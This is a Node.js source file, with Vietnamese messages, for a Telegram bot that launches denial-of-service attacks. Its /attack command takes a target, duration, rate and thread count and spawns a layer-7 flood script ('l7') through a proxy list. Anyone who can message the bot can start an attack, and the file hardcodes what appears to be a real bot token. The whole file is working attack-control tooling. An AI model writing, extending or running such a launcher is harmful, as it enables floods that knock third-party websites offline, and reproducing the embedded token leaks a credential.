const TelegramBot = require('node-telegram-bot-api');
const { spawn } = require('child_process');
const express = require('express');

const TOKEN = '7937745403:AAGBsPZIbCTzvhYhsOFkL-IVAQc3m-ta-Dc';
const bot = new TelegramBot(TOKEN, { polling: true });

const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Bot đang hoạt động!');
});

app.listen(PORT, () => {
  console.log(`Server chạy tại cổng ${PORT}`);
});

bot.on('message', (msg) => {
  console.log(`Nhận tin nhắn: ${msg.text} từ chat ID: ${msg.chat.id}`);
});

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Bot đã khởi động! Sử dụng /attack [target] [time] [rate] [thread] để bắt đầu.');
});

bot.onText(/^\/attack (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].trim().split(' ');

  if (args.length !== 4) {
    bot.sendMessage(chatId, '🚫 Cú pháp: /attack [target] [time] [rate] [thread]\nVí dụ: /attack example.com 60 100 10');
    return;
  }

  const [target, time, rate, thread] = args;

  if (!target || isNaN(time) || isNaN(rate) || isNaN(thread)) {
    bot.sendMessage(chatId, '🚫 Tham số không hợp lệ. Time, rate, thread phải là số.');
    return;
  }

  try {
    const command = spawn('node', ['l7', target, time, rate, thread, 'proxy.txt']);

    const info = {
      target,
      time: `${time}s`,
      rate,
      thread,
      proxy: 'proxy.txt'
    };

    const message = `✅ Attack Started!\n➖➖➖➖➖➖➖➖➖➖\n\`\`\`json\n${JSON.stringify(info, null, 2)}\n\`\`\``;
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });

    console.log(`[ATTACK] Target: ${target} | Time: ${time}s | Rate: ${rate} | Thread: ${thread}`);

    command.on('error', (error) => {
      console.error(`Lỗi spawn: ${error.message}`);
      bot.sendMessage(chatId, `❌ Lỗi: ${error.message}`);
    });

    command.on('close', (code) => {
      console.log(`Lệnh hoàn thành với mã: ${code}`);
      bot.sendMessage(chatId, `🚫 Lệnh hoàn thành với mã: ${code}`);
    });
  } catch (error) {
    console.error(`Lỗi khi thực thi: ${error.message}`);
    bot.sendMessage(chatId, `🚫 Lỗi: ${error.message}`);
  }
});

bot.on('polling_error', (error) => {
  console.error(`Lỗi polling: ${error.message}`);
});
